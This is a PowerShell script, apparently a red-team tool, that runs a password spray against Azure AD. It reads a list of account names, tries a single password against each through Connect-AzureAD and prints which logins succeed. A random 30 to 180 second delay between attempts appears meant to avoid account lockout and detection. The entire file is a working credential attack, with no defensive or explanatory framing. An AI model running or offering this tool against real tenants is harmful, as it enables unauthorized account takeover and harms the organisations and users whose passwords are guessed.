# Invoke-AzureADPasswordSpray.ps1
#
# Password spray an Azure AD environment.
#

Function Invoke-AzureADPasswordSpray
{
<#
    .SYNOPSIS
        .DESCRIPTION
        
    .PARAMETER account_list

    .PARAMETER Password

    .PARAMETER 

    .EXAMPLE
    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="File containing a list of accounts.")]
        [string]$accountlist,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Password to attempt on all accounts.")]
        [string]$pass
    )

    [string[]]$accounts = Get-Content -Path $accountlist
    Write-Host "[*] Parsed" $accounts.Count "account names"

    $secure_pass = ConvertTo-SecureString -String $pass -AsPlainText -Force
    
    $accounts_processed = 0
    foreach($account in $accounts)
    {
        $credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $account, $secure_pass

        # attempt to authenticate to AzureAD
        $account_id = $null
        try {
            Connect-AzureAD -Credential $credential -ErrorAction SilentlyContinue
            $session = Get-AzureADCurrentSessionInfo
            $account_id = $session.Account.Id
        }
        catch {
            Write-Host "[-] Failed login to" $account  
        }

        if($account_id -ne $null) {
            Write-Host "[+] Successful login to" $account
            Disconnect-AzureAD
        }
        $random_sleep = Get-Random -Maximum 180 -Minimum 30
        Start-Sleep -Seconds $random_sleep
        $accounts_processed += 1
        if ($accounts_processed % 100 -eq 0) {
            Write-Host "[*] Processed" $accounts_processed"/"$accounts.Count "accounts"
        }
    }
}